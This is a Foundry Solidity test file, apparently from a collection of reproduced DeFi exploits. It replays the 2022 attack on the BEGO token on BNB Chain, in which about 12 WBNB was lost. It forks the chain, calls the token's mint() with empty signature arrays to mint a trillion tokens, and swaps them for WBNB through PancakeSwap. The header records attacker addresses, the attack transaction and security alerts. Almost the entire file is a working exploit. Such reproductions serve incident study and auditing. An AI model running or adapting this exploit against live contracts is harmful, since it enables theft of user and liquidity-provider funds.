// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~12 WBNB
// Attacker : 0xde01f6Ce91E4F4bdB94BB934d30647d72182320F
// Attack Contract : 0x08a525104Ea2A92aBbcE8e4e61C667eED56f3B42
// Vulnerable Contract : 0xc342774492b54ce5F8ac662113ED702Fc1b34972
// Attack Tx : https://bscscan.com/tx/0x9f4ef3cc55b016ea6b867807a09f80d1b2e36f6cd6fccfaf0182f46060332c57

// @Info
// Vulnerable Contract Code : https://bscscan.com/token/0xc342774492b54ce5f8ac662113ed702fc1b34972#code#L1257

// @Analysis
// Twitter alert by Ancilia : https://twitter.com/AnciliaInc/status/1582828751250784256
// Twitter alert by Peckshield : https://twitter.com/peckshield/status/1582892058800685058

interface BEGO20 is IERC20 {
    function mint(uint256, string memory, address, bytes32[] memory, bytes32[] memory, uint8[] memory) external;
}

contract ContractTest is Test {
    BEGO20 constant BEGO_TOKEN = BEGO20(0xc342774492b54ce5F8ac662113ED702Fc1b34972);
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc", 22_315_679);
        // Adding labels to improve stack traces' readability
        vm.label(address(WBNB_TOKEN), "WBNB");
        vm.label(address(BEGO_TOKEN), "BEGO");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(0x88503F48e437a377f1aC2892cBB3a5b09949faDd, "WBNB_BEGO_PAIR");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker WBNB balance before exploit", WBNB_TOKEN.balanceOf(address(this)), 18
        );

        bytes32[] memory _r = new bytes32[](0);
        bytes32[] memory _s = new bytes32[](0);
        uint8[] memory _v = new uint8[](0);
        // Actual payload exploiting the vulnerability in the `mint()` function
        BEGO_TOKEN.mint(1_000_000_000_000 * 1e18, "t", address(this), _r, _s, _v);

        // Swap all minted BEGO to WBNB via PancakeSwap for profit dumping the price
        _BEGOToWBNB();

        emit log_named_decimal_uint(
            "[End] Attacker WBNB balance after exploit", WBNB_TOKEN.balanceOf(address(this)), 18
        );
    }

    /**
     * Auxiliary function to swap all BEGO to WBNB
     */
    function _BEGOToWBNB() internal {
        BEGO_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(BEGO_TOKEN);
        path[1] = address(WBNB_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            BEGO_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
